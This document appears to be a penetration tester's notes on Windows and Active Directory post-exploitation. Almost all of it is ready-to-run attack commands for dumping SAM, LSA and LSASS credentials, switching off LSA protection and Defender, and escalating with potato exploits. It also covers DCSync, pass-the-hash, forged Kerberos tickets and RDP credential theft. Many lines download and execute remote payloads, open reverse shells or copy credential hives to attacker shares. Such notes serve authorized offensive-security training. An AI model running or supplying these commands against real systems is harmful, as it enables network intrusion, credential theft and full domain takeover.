## Windows Specifics
### Credentials
#### Local (SAM)

    //SAM Database
            //local admin may not be enabled
        //Getting local Administrator SID:
            $env:computername
            [wmi] "Win32_userAccount.Domain='client',Name='Administrator'"
        //Getting SAM (as Admin):
            //*Method 1 (Meterpreter):
                hashdump
                mimikatz methods...
                *Or:
                    load kiwi
                    lsa_dump_secrets
                    lsa_dump_sam
                    creds_all
            //*Method 2 (remotely, if you have creds - SecretsDump.py - requires access to 445):
                secretsdump.py test.local/john:password123@10.10.10.1
                w/ hash:  secretsdump.py WORKGROUP/Administrator@10.1.1.1 -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
                //MSF:  use auxiliary/scanner/smb/impacket/secretsdump; set rhosts 192.168.1.108; set smbuser administrator; set smbpass Ignite@987; exploit
            //Method 3 (Mimikatz):
                //via .exe or Invoke-Mimikatz.ps1
                # Local dumping of SAM secrets on the target
                    lsadump::sam
                # Offline dumping of SAM secrets from exported hives
                    lsadump::sam /sam:'C:\path\to\sam.save' /system:'C:\path\to\system.save'
                # Local dumping of LSA secrets on the target
                    lsadump::secrets
                # Offline dumping LSA secrets from exported hives
                    lsadump::secrets /security:'C:\path\to\security.save' /system:'C:\path\to\system.save'
                //Invoke-Mimikatz.ps1:
                    (new-object system.net.webclient).downloadstring('http://192.168.45.210/amsi.txt') | IEX
                    (New-Object System.Net.WebClient).DownloadString('http://192.168.45.210/Invoke-Mimikatz.ps1') | IEX
                    Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "log out.txt" "lsadump::sam" "exit"'
            //Manual Methods:
                //Method 1:
                    wmic shadowcopy call create Volume='C:\'
                    //confirm:  vssadmin list shadows
                    //get SAM:  copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam C:\users\offsec.corp1\Downloads\sam
                    //get encryption keys:   copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system C:\users\offsec.corp1\Downloads\system
                //Method 2:
                    mkdir c:\temp && reg save hklm\sam C:\temp\SAM && reg save hklm\system C:\temp\SYSTEM
                    //Transfer Files:
                        impacket-smbserver share $(pwd) -smb2support
                        copy .\SAM \\192.168.45.215\share2 && copy .\SYSTEM \\192.168.45.215\share2
                //Method 6 - Copy-VSS.ps1:
                    //add to bottom:  Copy-VSS -DestinationDir C:\temp\
                    IEX(New-Object Net.Webclient).DownloadString('http://192.168.45.215/Copy-VSS.ps1')
            //Check for old/backup files:
                cd C:\ & dir /S /B SAM == SYSTEM == SAM.OLD == SYSTEM.OLD == SAM.BAK == SYSTEM.BAK
            //Other methods - https://www.thehacker.recipes/a-d/movement/credentials/dumping/sam-and-lsa-secrets
        //Decrypting it:
            secretsdump.py -sam SAM -system SYSTEM LOCAL
            //or:  samdump2 SYSTEM SAM

    //Microsoft Hardening Local Admin accounts
        //Server 2008: Group Policy Preferences (GPP) - update local admin passwords via Sysvol .xml file
            //Locate and Decrypt (could still exist):  Get-GPPPassword.ps1
                IEX(New-Object Net.Webclient).DownloadString('http://192.168.45.215/Get-GPPPassword.ps1')
            //Metasploit:  post/windows/gather/credentials/gpp
            //Decrypt a cpassword:  gpp-decrypt <cpassword>
        //2015: replaced GPP with Local Administrator Password Solution (LAPS) - added ms-mcs-AdmPwdExpirationTime and ms-mcs-AdmPwd fields to AD
            //If LAPS is not enabled, check for local credential reuse
            //If LAPS is in use, we should try to gain access to the clear text passwords in Active Directory
                //LAPSToolkit.ps1:
                        //IEX(New-Object Net.Webclient).DownloadString('http://192.168.45.215/LAPSToolkit.ps1')
                    Import-Module .\LAPSToolkit.ps1
                    Get-LAPSComputers               //might show blank pw if not allowed
                    Find-AdmPwdExtendedRights
                    Find-LAPSDelegatedGroups        //see what groups are allowed to view it
                        //Check group members w/ PowerView.ps1:  Get-NetGroupMember -Identity "LAPS Password Readers" -Recurse
                            ***target these users!
            //Metasploit:
                use post/windows/gather/credentials/enum_laps

#### Access Tokens (and Privesc)

    //Theory:
        //created upon authentication, linked to user through SID
        //4 Integrity Levels: low, medium, high, system
            //local Admin regulated by UAC has 2 tokens - medium and high
        //Token also contains privileges - Bitmask #1 is the token's privilege set; and Bitmask #2 (modifiable) is which privs are enabled currently
            //View current privileges:  whoami /priv
            //modify privs:  secpol.msc
        //Impersonation tokens - have 4 levels - Anonymous, Identification, Impersonation, Delegation

    //Elevation w/ Impersonation:
        //SeImpersonatePrivilege/SeAssignPrimaryTokenPrivilege
            //Network Service account, LocalService account, and default IIS account have it assigned by default - allows for privesc
        ***
            Windows Server 2019: either RoguePotato or PrintSpoofer should work
                RoguePotato requires access to second machine and is more complex
            Juicy Potato only works up to Windows Server 2016
            FaxHell only works in context of Network Service
            Beans technique only works on desktop editions
        ***
        //To Test:
                psexec64 -i -u "NT AUTHORITY\Network Service" cmd.exe
        ex. PrintSpoofer/SpoolSample:
            //Check if spooler service is running:  Get-Service Spooler
                //or:  dir \\cdc01\pipe\spoolss
            //Defender will flag PrintSpoofer by default, but SpoolSample and PrintSpooferNet/SharpPrintSpoofer should be fine
            //Method 1 - Manual (SharpPrintSpoofer.exe):
                //Step 1:  SharpPrintSpoofer.exe \\.\pipe\test\pipe\spoolss cmd -i
                    or:  \\.\pipe\test\pipe\spoolss "powershell -exec bypass -c iex(new-object net.webclient).downloadstring('http://10.10.13.37/run.txt')"
                //Step 2:  SpoolSample.exe <TGThostname> <CAPTUREhostname>/pipe/test 
                    Or:  .\MS-RPRN.exe \\<TGThostname> \\<CAPTUREhostname>/pipe/test
                //Troubleshooting - non-login sessions require the '-i'
                //Seems like... payloads can be called multiple times (manual vs. getsystem); pipe must be called test
                //Another Example (Local Privesc):
                    //start multi/handler with run -j
                    //upload all 3 files to the host (web01)
                    c:\inetpub\wwwroot\upload\SharpPrintSpoofer.exe \\.\pipe\test\pipe\spoolss C:\inetpub\wwwroot\Upload\Hollow.exe -i
                    //background, then new shell:
                    ctrl+z, channel -i 1
                    c:\inetpub\wwwroot\upload\SpoolSample.exe web01 web01/pipe/test
            ***     ***All-in-One Method:
                        //use 64bit build
                        upload /home/kali/data/SpoolSampleModified/SpoolSampleModified/bin/x64/Release/SpoolSampleModified.exe S.exe
                        upload /home/kali/data/Hollow/Hollow/bin/x64/Release/Hollow.exe H.exe
                        c:\windows\tasks\S.exe web01 web01/pipe/test "C:\windows\tasks\H.exe"
            //Method 2 - Invoke-BadPotato.ps1:
                //IEX(New-Object Net.Webclient).DownloadString('http://192.168.49.121/Invoke-BadPotato.ps1')    
                    //add to bottom:  Invoke-BadPotato -C "C:\windows\temp\msf.exe"
            //Other Method - RoguePotato (requires lenient firewall):
                //victim:
                    RogueOxidResolver.exe -l 9999
                    RoguePotato.exe -r <kaliIP> -e "iex(new-object net.webclient).downloadstring('http://172.16.1.30/Invoke-PowerShellTcp443.ps1')" -l 9999
                //kali:  socat tcp-listen:135,reuseaddr,fork tcp:<tgtIP>:9999
        //Older methods:
            JuicyPotato/RottenPotato - works on Win10 and Server 2016 (blocked on Win10 1809 and newer, along with Server 2019)

    //Meterpreter - Incognito:
        //allows impersonation of logged-in users
        load incognito / use incognito
        help incognito
        list_tokens -u
        impersonate_token corp1\\admin
        drop_token

#### Kerberos & Domain (Locally)

    //most require admin privs to view/dump
    //Option 1: Mimikatz - Live Pull from Lsass:
        //TGTs automatically renew, and password hashes are cached in LSASS memory
        //Dumping Cached Kerberos creds (as admin):
            mimikatz.exe
            privilege::debug
            sekurlsa::logonpasswords
            //In Meterpreter:  
                //Option 1: load mimikatz; msv  \\  creds_all  \\  kerberos  \\  mimikatz_command -f samdump::hashes  \\  mimikatz_command -f sekurlsa::searchPasswords  \\  execute -H -i -c -f /root/Desktop/Mimikatz/x64/mimikatz.exe -m
                //**Option 2: load kiwi; creds_all  \\  creds_msv  \\  creds_kerberos   (require System)
                //Option 3: load kiwi; kiwi_cmd "privilege::debug"; kiwi_cmd "sekurlsa::logonPasswords full"; kiwi_cmd "sekurlsa::credman"; kiwi_cmd "SEKURLSA::Kerberos"; kiwi_cmd "SEKURLSA::Krbtgt"; kiwi_cmd "SEKURLSA::SSP"; kiwi_cmd "SEKURLSA::Wdigest"  
            //Invoke-Mimikatz.ps1:
                (new-object system.net.webclient).downloadstring('http://192.168.45.210/amsi.txt') | IEX
                (New-Object System.Net.WebClient).DownloadString('http://192.168.45.210/Invoke-Mimikatz.ps1') | IEX
                Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "log out.txt" "sekurlsa::logonPasswords full" "sekurlsa::credman" "SEKURLSA::Kerberos" "SEKURLSA::Krbtgt" "SEKURLSA::SSP" "SEKURLSA::Wdigest" "exit"'
        //to enable WDigest (stores passwords as cleartext in memory):
            reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
        //Microsoft Mitigations:
            //LSA Protection
                //additional integrity level - Protected Processes Light (PPL) - not all System processes can interact with it
                //disabled by default for LSASS, but check! - RunAsPPL DWORD value at HKLM\SYSTEM\CurrentControlSet\Control\Lsa
                    //Check:  Get-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -Name "RunAsPPL"
                //*Solution w/ Mimikatz (requires mimidrv.sys to be uploaded):
                    !+          //load mimidrv.sys driver
                    !processprotect /process:lsass.exe /remove          //disable PPL protection    
                //Meterpreter:
                    load kiwi
                    lsa_dump_secrets
                    lsa_dump_sam
                //**Better Method - PPLKiller:
                    reg add HKLM\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters /t REG_DWORD /v AllowInsecureGuestAuth /d 1 /f
                    \\192.168.45.210\visualstudio\PPLKiller\x64\Release\PPLKiller.exe /installDriver
                    \\192.168.45.210\visualstudio\PPLKiller\x64\Release\PPLKiller.exe /disableLSAProtection
                    <perform dump>
                    \\192.168.45.210\visualstudio\PPLKiller\x64\Release\PPLKiller.exe /uninstallDriver
                //**Remotely - lsassy:
                    lsassy [-d domain] -u pixis -p P4ssw0rd targets
                    lsassy [-d domain] -u pixis -H [LM:]NT targets
                //*In-Memory (mostly) Solution:
                    //upload mimidrv.sys to target
                    sc create mimidrv binPath= C:\tmp\mimidrv.sys type= kernel start= demand
                    sc start mimidrv
                    //In PS:
                        (New-Object System.Net.WebClient).DownloadString('http://192.168.49.69/AMSI.txt') | IEX
                        (New-Object System.Net.WebClient).DownloadString('http://192.168.49.69/mimikatz.txt') | IEX
                        Invoke-Mimikatz -Command "`"!processprotect /process:lsass.exe /remove`"" 
                            *might be flagged by Defender, but once is probably ok (then use minidump, etc.)
                //**Automated:
                    (New-Object System.Net.WebClient).DownloadString('http://192.168.45.210/DisableLSA.ps1') | IEX
                    //Disable-LSA.ps1:
                        # Load
                        (New-Object System.Net.WebClient).DownloadString('http://192.168.45.210/Invoke-Mimikatz.ps1') | IEX
                        (New-Object System.Net.WebClient).DownloadFile("http://192.168.45.210/mimidrv.sys",'C:\inetpub\wwwroot\upload\mimidrv.sys')

                        # Execute
                        cmd /c "sc query mimidrv || (sc create mimidrv binPath= C:\inetpub\wwwroot\upload\mimidrv.sys type= kernel start= demand && sc start mimidrv)"
                        Invoke-Mimikatz -Command "`"!processprotect /process:lsass.exe /remove`""
                //Another Method:
                    mountvol X: /s
                    copy C:\LSAPPLConfig.efi X:\EFI\Microsoft\Boot\LSAPPLConfig.efi /Y
                    bcdedit /create {0cb3b571-2f2e-4343-a879-d86a476d7215} /d "DebugTool" /application osloader
                    bcdedit /set {0cb3b571-2f2e-4343-a879-d86a476d7215} path "\EFI\Microsoft\Boot\LSAPPLConfig.efi"
                    bcdedit /set {bootmgr} bootsequence {0cb3b571-2f2e-4343-a879-d86a476d7215}
                    bcdedit /set {0cb3b571-2f2e-4343-a879-d86a476d7215} loadoptions %1
                    bcdedit /set {0cb3b571-2f2e-4343-a879-d86a476d7215} device partition=X:
                    mountvol X: /d
                    shutdown -r -t 0
            //Windows Defender Credential Guard
                //*Check if running:
                    $DevGuard = Get-CimInstance –ClassName Win32_DeviceGuard –Namespace root\Microsoft\Windows\DeviceGuard; if ($DevGuard.SecurityServicesConfigured -contains 1) {"Credential Guard configured"}; if ($DevGuard.SecurityServicesRunning -contains 1) {"Credential Guard running"}
                //Workaround w/ mimilib.dll - can still log creds when users login - https://medium.com/red-teaming-with-a-blue-team-mentality/poking-around-with-2-lsass-protection-options-880590a72b1a

    //Option 2: Memory Dump Lsass & Process Credentials Offline:
        //memory dump of LSASS - better for avoiding detection by not uploading mimikatz
            //*must process on machine of same OS and architecture
        //Option 1 - Task Manager (requires GUI access): right click, create dump file
        //Option 2 - procdump (could be detected):
            procdump -ma lsass.exe lsass.dmp
        //Option 3 - Out-Minidump.ps1:
            //might require mimidrv.sys mitigation (if getting error message)
            Import-Module .\Out-Minidump.ps1; Get-Process lsass | Out-Minidump
            //IEX(New-Object Net.Webclient).DownloadString('http://192.168.45.215/Out-Minidump.ps1')
                    //add to bottom:  Get-Process lsass | Out-Minidump
        //Option 4 - Dumpert DLL:
            //writes file to c:\Windows\Temp
            rundll32.exe \\192.168.45.215\visualstudio\Dumpert\Dumpert-DLL\x64\Release\Outflank-Dumpert-DLL.dll,Dump
            //Or:  \\192.168.45.215\visualstudio\Dumpert\Dumpert\x64\Release\Outflank-Dumpert.exe
        //Option 5 - MiniDumpWriteDump:
            //still require mimidrv.sys mitigation (if getting error message)
            //Basic (writes file to c:\windows\tasks):  \\192.168.45.215\visualstudio\MiniDumpWriteDump\MiniDumpWriteDump\bin\x64\Release\MiniDumpWriteDump.exe
            //SafetyDump (outputs b64-encoded lsass dump; can also dump other processes):
                \\192.168.45.215\visualstudio\MiniDumpWriteDump\SafetyDump\bin\x64\Release\SafetyDump.exe > c:\windows\tasks\64.txt
                certutil -decode c:\windows\tasks\64.txt c:\windows\tasks\lsa.txt
            //EncryptedDump (writes encrypted dmp to cwd; decrypt w/ python3 decrypt.py)
                \\192.168.45.215\visualstudio\MiniDumpWriteDump\x64\Release\EncryptedDump.exe
        //*Option 6 (Remotely) - lsassy:
            //can automatically take care of minidrv.sys error
            lsassy [-d domain] -u pixis -p P4ssw0rd targets
            lsassy [-d domain] -u pixis -H [LM:]NT targets
        **Run Mimikatz against dump:
            mimikatz.exe
            sekurlsa::minidump c:\windows\tasks\lsa.txt
            sekurlsa::logonpasswords
        **Or Pypykatz to parse on Kali:
            pypykatz lsa minidump /tmp/lsa/lsa.txt

#### Domain Controller

    //DCSync:
        //dump any user's hash - requires LDAP access to DC
        //PowerShell:
            Invoke-Mimikatz -Command '"lsadump::dcsync /domain:megacorp.local /user:MEGACORP\krbtgt" "exit"'
            Invoke-Mimikatz -Command '"lsadump::dcsync /domain:megacorp.local /user:MEGACORP\administrator" "exit"'
            Invoke-DCSync -GetComputers -Domain megacorp.local -DomainController DC1.megacorp.local
        //**Meterpreter:
            load kiwi
            kiwi_cmd "lsadump::dcsync /domain:tricky.com /user:tricky\administrator"
        //Linux:
            //creds: secretsdump.py MEGACORP/snovvcrash:'Passw0rd!'@DC1.megacorp.local -dc-ip 192.168.1.11 -just-dc-user 'MEGACORP\krbtgt'
            //kerb:  secretsdump.py DC1.megacorp.local -dc-ip 192.168.1.11 -just-dc-user 'MEGACORP\krbtgt' -k -no-pass

    //After Compromising DC, get SYSTEM shell on remaining targets:
        load kiwi
        creds_all
        //ex. PTH as domain admin to CLIENT09:
            proxychains wmiexec.py TRICKY.COM/Administrator@172.16.173.155 -hashes aad3b435b51404eeaad3b435b51404ee:48989de6a73f952ad51adceabc13cc9c
            reg add HKLM\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters /t REG_DWORD /v AllowInsecureGuestAuth /d 1 /f
            \\192.168.49.121\visualstudio\Hollow\Hollow\bin\x64\Release\Hollow.exe

    //NTDS.dit:
        //Recon:
            //MSF:  use post/windows/gather/ntds_location; set session 1; exploit
        //Dump & Parse:
            //Local:
                fgdump.exe
                powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"
                NTDSDumpEx.exe -d C:\ntds.dit -s C:\SYSTEM
            //Remote:
                //CME:
                    crackmapexec smb 192.168.1.105 -u 'Administrator' -p 'Ignite@987' --ntds drsuapi
                //MSF:
                    use auxiliary/scanner/smb/impacket/secretsdump; set rhosts 192.168.1.108; set smbuser administrator; set smbpass Ignite@987; exploit
        //Dump:
            //MSF:
                use post/windows/gather/ntds_grabber; set session 1; exploit
                cabextract <cab filename>
        //Parse:
            secretsdump.py -ntds /root/ntds.dit -system /root/SYSTEM LOCAL

        //Crack:
            john --format=NT hash

#### Credential Spraying

    //Check Lockout Policy (if user has DC access):
        cme smb 192.168.189.132 -u bob -p 'abc123!' [--local-auth] --pass-pol
        net accounts /domain
        Get-ADDefaultDomainPasswordPolicy

    //Get Users:
        ex. GetADUsers.py MEGACORP/snovvcrash:'Passw0rd!' -all -dc-ip 192.168.1.11 | tee ~/ws/log/GetADUsers.out

    //Spray:
        //CrackMapExec:
            //check local and domain - detects local auth or domain automatically, but to specify a different domain for auth:  -d domain
            --continue-on-success to check all combos
            --local-auth for local auth on a domain box
            -p for pass, -H for hash
            //Local Auth:
                proxychains -q crackmapexec smb 172.16.177.0/24 -u 'Administrator' -H /tmp/hashes.txt --local-auth
            //SMB: proxychains -q crackmapexec smb 172.16.177.254 -u /tmp/users.txt -H /tmp/hashes.txt
            //Winrm:  proxychains -q crackmapexec winrm 172.16.177.254 -u /tmp/users.txt -H /tmp/hashes.txt
            //RDP:  proxychains -q crackmapexec rdp 172.16.177.254 -u /tmp/users.txt -p /tmp/pass.txt
            //Kerberos:
                export KRB5CCNAME=...
                //add DChostname to /etc/hosts
                proxychains -q crackmapexec smb 172.16.177.0/24 -k --use-kcache --kdcHost <DChostname>
        //RCE:
            -x switch to execute commands from cmd.exe or the -X switch to perform commands using PowerShell
            ex. -x "ping -n 2 192.168.49.121"
            //Reverse Shell example w/ Nishang:
                //add to bottom of Invoke-PowerShellTcp.ps1:  Invoke-PowerShellTcp -Reverse -IPAddress 172.16.1.30 -Port 443
                crackmapexec smb 172.16.1.200 -u administrator -H 3542d79d5d17bc9d3014d4d56b5e3060 --local-auth -X "iex(new-object net.webclient).downloadstring('http://172.16.1.30/Invoke-PowerShellTcp443.ps1')"
        //MSF - SMB (w/ password):
            use auxiliary/scanner/smb/smb_login
            set RHOSTS <DC_IP>
            set SMBDomain megacorp.local
            set SMBPass Passw0rd!
            set USER_FILE /home/snovvcrash/ws/enum/all-users.txt
            set VERBOSE False
            run

#### RDP Credential Monitor

    **use if a user is initiating outbound RDP connections to another box

    //Stealing Clear Text Credentials from RDP:
        //using RdpThief.dll and my RdpThiefInjector.exe - running loop that constantly checks for mstsc.exe process to inject into
            //RdpThief.dll must be on target (C:\Windows\Tasks\RdpThief.dll)
        //start RdpThiefInjector.exe on the machine you want to monitor connections from - whereever users are initiating connections out from
        //results:  type C:\Users\dave\AppData\Local\Temp\6\data.bin
        //Other method - svchost dump:  https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/credential-harvesting/from-memory/svchost-exe

### Lateral Movement
- Service SPN Access Methods:  HTTP (WinRM), LDAP (DCSync), HOST (PsExec shell or schtasks), MSSQLSvc (DB admin rights), HOST&RPCSS (WMI), CIFS&HTTP (PS Remoting)
#### Remote Desktop Protocol (RDP)

        //existing user is disconnected by default - unless you use the /admin flag
        //NTLM hash stays in memory until logout (not exit!) - unless using restricted admin mode (/restrictedadmin)
    //Dumping Creds w/ Mimikatz:
        privilege::debug; !+; !processprotect /process:lsass.exe /remove; sekurlsa::logonpasswords
    //PTH (if Restricted Admin mode is enabled):
        //Mimikatz:  privilege::debug; sekurlsa::pth /user:admin /domain:corp1 /ntlm:2892D26CDF84D7A70E2EB3B9F05C425E /run:"mstsc.exe /restrictedadmin"
        //xfreerdp:   xfreerdp /u:admin /pth:2892D26CDF84D7A70E2EB3B9F05C425E /v:192.168.120.6 /cert-ignore
    //Enabling Restricted Admin Mode via PS Remoting and PTH:
        sekurlsa::pth /user:admin /domain:corp1 /ntlm:2892D26CDF84D7A70E2EB3B9F05C425E /run:powershell
        Enter-PSSession -Computer appsrv01
        New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name DisableRestrictedAdmin -Value 0
        //Or:  cme smb 10.0.0.200 -u Administrator -H 8846F7EAEE8FB117AD06BDD830B7586C -x 'reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f'
    //Reverse RDP Proxying w/ Metasploit (Socks):
        //useful if NAT is enabled
        use multi/manage/autoroute; set session 1; exploit
        use auxiliary/server/socks_proxy; set srvhost 127.0.0.1; exploit -j         //to stop: jobs; kill 0
        sudo bash -c 'echo "socks4 127.0.0.1 1080" >> /etc/proxychains.conf'
        proxychains rdesktop 192.168.120.10
    //Reverse RDP Proxying w/ Chisel
        //Build .exe:  env GOOS=windows GOARCH=amd64 go build -o chisel.exe -ldflags "-s -w"
        //Start server on kali
            ./chisel server -p 8080 --reverse
        //Transfer and run Client on Windows:
            upload /home/kali/data/chisel/chisel.exe c:\\Users\\Administrator\\Desktop
            //Socks Method:  chisel.exe client 192.168.45.215:8080 R:socks
            //Local tunnel Method:  chisel client 192.168.45.215:8080 R:33890:10.10.10.240:3389
    //RDP as a Console:
        //no reverse tunnel necessary - execute commands directly from one target to next
        ex. sharprdp.exe computername=appsrv01 command="powershell (New-Object System.Net.WebClient).DownloadFile('http://192.168.45.215/msf.exe', 'C:\Windows\Tasks\met.exe'); C:\Windows\Tasks\met.exe" username=corp1\dave password=lab
    //Stealing Clear Text Credentials from RDP:
        //using RdpThief.dll and my RdpThiefInjector.exe - running loop that constantly checks for mstsc.exe process to inject into
            //RdpThief.dll must be on target (C:\Windows\Tasks\RdpThief.dll)
        //start RdpThiefInjector.exe on the machine you want to monitor connections from - whereever users are initiating connections out from
        //results:  type C:\Users\dave\AppData\Local\Temp\6\data.bin
        //Other method - svchost dump:  https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/credential-harvesting/from-memory/svchost-exe

#### Fileless Lateral Movement via RPC - SharpSCExec.exe / SCShell.py

    //requires access to SMB/445
    //better method - modifying an existing service instead of creating a new service or writing a file to disk (like psexec)
    //**good way to get RCE from CIFS access

    //*select a service that's not vital and not in use by default (ex. SensorService) - Potential candidates: SensorService, lfsvc, BTAGService, XblAuthManager
    //if using current token, don't need to provide domain/user/pass
    //*if it stops working, delete and re-add the ticket (and troubleshoot access - ex. ls \\file01\c$)

    ex. SharpSCExec.exe SRV01 SensorService "cmd.exe /c ping -n 2 10.10.13.37"
            //providing domain/creds at end is optional (if you already have ticket/access)
        \\192.168.45.215\visualstudio\SharpSCExec\SharpSCExec\bin\x64\Release\SharpSCExec.exe appsrv01 SensorService "cmd.exe /c calc" corp1.com Admin lab
        SharpSCExec.exe 192.168.197.131 SensorService "C:\windows\system32\cmd.exe /C C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe C:\payload.csproj" . administrator Password
        *also possible via mimikatz and PTH - sekurlsa::pth /user:user /domain:domain /ntlm:hash /run:cmd.exe - then run it
        **Disable Defender before shell:
            \\192.168.45.158\visualstudio\SharpSCExec\SharpSCExec\bin\x64\Release\SharpSCExec.exe FILE01 SensorService "cmd.exe /c c:\PROGRA~1\WINDOW~1\MpCmdRun.exe -RemoveDefinitions -All"
        **Best Shell Method - copy and execute Hollower/Injector:
            copy \\192.168.45.158\visualstudio\Hollow\Hollow\bin\x64\Release\Hollow.exe \\file01\c$\windows\tasks
            \\192.168.45.158\visualstudio\SharpSCExec\SharpSCExec\bin\x64\Release\SharpSCExec.exe FILE01 SensorService "C:\windows\tasks\Hollow.exe"
            **Or:  C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe c:\Windows\Tasks\SharpSCExec.csproj
                //replace the arguments within the file
                //w/ payload:  C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe c:\Windows\Tasks\HollowUAC.csproj
        *Or enable and run via SMB:
            \\192.168.45.158\visualstudio\SharpSCExec\SharpSCExec\bin\x64\Release\SharpSCExec.exe FILE01 SensorService "cmd.exe /c netsh advfirewall set currentprofile state off"
            \\192.168.45.158\visualstudio\SharpSCExec\SharpSCExec\bin\x64\Release\SharpSCExec.exe FILE01 SensorService "reg add HKLM\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters /t REG_DWORD /v AllowInsecureGuestAuth /d 1 /f"
            \\192.168.45.158\visualstudio\SharpSCExec\SharpSCExec\bin\x64\Release\SharpSCExec.exe FILE01 SensorService "\\192.168.45.158\visualstudio\Injector\NtProcessInjector\bin\x64\Release\NtProcessInjector.exe explorer"

    //**PTH w/ SCShell.py:
        python scshell.py MEGACORP/snovvcrash@192.168.1.11 -hashes :fc525c9683e8fe067095ba2ddc971889 -service-name lfsvc
        SCShell>C:\windows\system32\cmd.exe /c powershell.exe -nop -w hidden -c iex(new-object net.webclient).downloadstring('http://10.10.13.37:8080/payload.ps1')

#### Other Domain Methods

    **wmiexec.py w/ creds or hash
    **psexec.py w/ creds or hash

    //Overpass-the-hash:
        //Request a full TGT on behalf of the target user and pass it into the current session
        //*useful in networks where NTLM protocol is disabled and only Kerberos is allowed
        # NOTE: Make sure to clear tickets in the current session (with 'klist purge') to ensure you don't have multiple active TGTs
            .\Rubeus.exe asktgt /user:Administrator /rc4:[NTLMHASH] /ptt
        # More stealthy variant, but requires the AES256 key (see 'Dumping OS credentials with Mimikatz' section)
            .\Rubeus.exe asktgt /user:Administrator /aes256:[AES256KEY] /opsec /ptt
        # Pass the ticket to a sacrificial hidden process, allowing you to e.g. steal the token from this process (requires elevation)
            .\Rubeus.exe asktgt /user:Administrator /rc4:[NTLMHASH] /createnetonly:C:\Windows\System32\cmd.exe
        # Or, a more opsec-safe version that uses the AES256 key (similar to with Rubeus above) - works for multiple Mimikatz commands
            sekurlsa::pth /user:Administrator /domain:targetdomain.com /aes256:[AES256KEY] /run:powershell.exe
        //Mimikatz (riskier):
            sekurlsa::pth /user:Administrator /domain:targetdomain.com /ntlm:[NTLMHASH] /run:powershell.exe
            //or:  Invoke-Mimikatz -Command '"sekurlsa::pth /user:UserName /domain:DomainName /ntlm:HASH /run:powershell.exe"'
            klist
            Invoke-Command -computername <remoteMachine.domain> -ScriptBlock {whoami;hostname}
        //Rubeus:
            \\192.168.49.121\visualstudio\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /domain:dollarcorp.moneycorp.local /user:svcadmin /rc4:b38ff50264b74508085d82c69794a4d8 /ptt

    # Golden ticket (domain admin, w/ some ticket properties to avoid detection)
    kerberos::golden /user:Administrator /domain:targetdomain.com /sid:S-1-5-21-[DOMAINSID] /krbtgt:[KRBTGTHASH] /id:500 /groups:513,512,520,518,519 /startoffset:0 /endin:600 /renewmax:10080 /ptt

    # Silver ticket for a specific SPN with a compromised service / machine account
    kerberos::golden /user:Administrator /domain:targetdomain.com /sid:S-1-5-21-[DOMAINSID] /rc4:[MACHINEACCOUNTHASH] /target:dc.targetdomain.com /service:HOST /id:500 /groups:513,512,520,518,519 /startoffset:0 /endin:600 /renewmax:10080 /ptt

    //Other Methods:
        //WMIC RCE method (w/ creds):
            copy \\192.168.45.158\visualstudio\Hollow\Hollow\bin\x64\Release\Hollow.exe \\file01\c$\Windows\Temp
            wmic /node:target.domain /user:domain\user /password:password process call create "C:\Windows\Temp\Hollow.exe"
        //DCOM RCE method:
            [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","192.168.10.30")).Document.ActiveView.ExecuteShellCommand("c:\windows\Microsoft.NET\Framework\v4.0.30319\Msbuild.exe",$null,"\\192.168.10.131\webdav\build.xml","7")


### Connect, Pivot, Elevate:  

    Connect via Creds:
        Port 22: SSH
        Port 23: Telnet
        Port 135/445:
            PsExec.exe domain/user@IP  \\  python3 psexec.py domain/user@IP
            python3 smbexec.py domain/user@IP
            wmiexec.exe domain/user@IP  \\  python3 wmiexec.py domain/user@IP
            winexe -U <domain/username>%<password> //<targetIP> cmd.exe
        Port 3389: RDP
              rdesktop [-d <DOMAIN>] -u <USERNAME> [-p <PASS>] <IP>  \\  xfreerdp /u:[DOMAIN\]<USERNAME> /p:<PASSWORD> /v:<IP> +clipboard
        Port 5985/5986: winRM
            ruby evil-winrm.rb -i 10.0.0.20 -u user -p PASS

    Connect via Pass the Hash:
        https://blog.ropnop.com/practical-usage-of-ntlm-hashes/
        //Only works for NTLM (not NTLMv2/Net-NTLM)
        RPC:
            Show Endpoints:  python rpcdump.py -hashes 00000000000000000000000000000000:32196B56FFE6F45E294117B91A83BF38 ignite/Administrator@192.168.1.105
            Connect:  pth-rpcclient -U ignite/Administrator%00000000000000000000000000000000:32196B56FFE6F45E294117B91A83BF38 //192.168.1.105
        Port 135/445:
            PSExec:  python3 psexec.py -hashes 00000000000000000000000000000000:32196B56FFE6F45E294117B91A83BF38 Administrator@192.168.1.105
                MSF:  use exploit/windows/smb/psexec  \\  use admin/smb/psexec_command (stealthier)
                If STATUS_ACCESS_DENIED (Command=117 WordCount=0):  set “HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\LanManServer\Parameters” RequireSecuritySignature to ‘0’
            *PTH-Winexe:  pth-winexe -U [domain/]offsec%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e //10.11.0.22 cmd.exe
                Only replace after the ':'
            PTH-wmic:  pth-wmic -U ignite/Administrator%00000000000000000000000000000000:32196B56FFE6F45E294117B91A83BF38 //192.168.1.105 "select Name from Win32_UserAccount"
